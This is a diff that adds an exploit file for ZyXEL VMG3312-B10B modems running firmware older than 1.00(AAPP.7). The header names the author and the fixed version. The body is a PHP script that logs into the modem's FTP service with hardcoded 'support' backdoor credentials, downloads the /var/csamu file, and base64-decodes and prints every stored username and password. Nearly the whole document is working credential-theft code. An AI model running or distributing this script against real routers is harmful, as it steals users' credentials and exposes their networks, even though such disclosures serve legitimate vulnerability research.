@@ -1,0 +1,35 @@
+# Exploit Title: ZyXEL VMG3312-B10B - Leak Credentials < 1.00(AAPP.7)
+# Date: 2018-10-28
+# Exploit Author: numan türle @numanturle
+# Vendor Homepage: https://www.zyxel.com/
+# Software Link: ftp://ftp.zyxel.com.tr/ZyXEL_URUNLERI/MODEMLER/VDSL_MODEMLER/VMG3312-B10B/
+# Firmware: 1.00(AAPP.0)D7 
+# Tested on: windows
+# Fixed firmware: 1.00(AAPP.7)
+
+
+<?php 
+$ftp_server = "192.168.1.1"; // modem ip address
+$ftp_conn = ftp_connect($ftp_server) or die("ftp server close");
+$login = ftp_login($ftp_conn, "support", "support"); // backdoor 
+
+$local_file = "crackme";
+$server_file = "/var/csamu"; // base64_encode files
+
+if (ftp_get($ftp_conn, $local_file, $server_file, FTP_BINARY)) {
+	$open = file($local_file);
+	foreach($open as $u_p){
+		$bomb = explode(" ",$u_p);
+		$user = $bomb[0];
+		$pass = base64_decode($bomb[1]);
+		if(!empty($pass)){
+			echo "{$user}:{$pass}<br>";
+		}else {
+			continue;
+		}
+	}
+}else {
+	echo "pfff";
+}
+ftp_close($ftp_conn); 
+?>
